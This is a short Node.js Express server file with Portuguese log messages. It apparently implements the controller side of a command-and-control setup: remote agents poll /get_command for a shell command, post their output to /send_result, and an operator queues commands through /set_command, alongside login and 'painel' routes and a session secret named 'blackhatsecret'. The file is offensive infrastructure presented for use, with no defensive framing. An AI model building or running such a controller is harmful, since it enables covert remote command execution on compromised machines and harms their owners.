const express = require("express")
const session = require("express-session");
const app = express()
const PORT = 8000

app.use(express.urlencoded({ extended: true }))
app.use(express.static("static"))

app.use(session({
    secret: "blackhatsecret",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 3600000 }
}));
 
const authRoutes = require("./routes/auth");
const painelRoutes = require("./routes/painel");

app.use("/", authRoutes);
app.use("/", painelRoutes); 


let currentCommand = "";

app.get("/get_command", (req, res) => {
    res.json({ command: currentCommand });
});

app.post("/send_result", express.json(), (req, res) => {
    const { result } = req.body;
    console.log("Resultado do agente:", result);
    res.json({ status: "ok" });
});

app.post("/set_command", express.json(), (req, res) => {
    const { command } = req.body;
    currentCommand = command;
    res.json({ status: "comando recebido" });
});


app.listen(PORT, () => {
    console.log(`Servidor rodando no http://localhost:${PORT}`)
})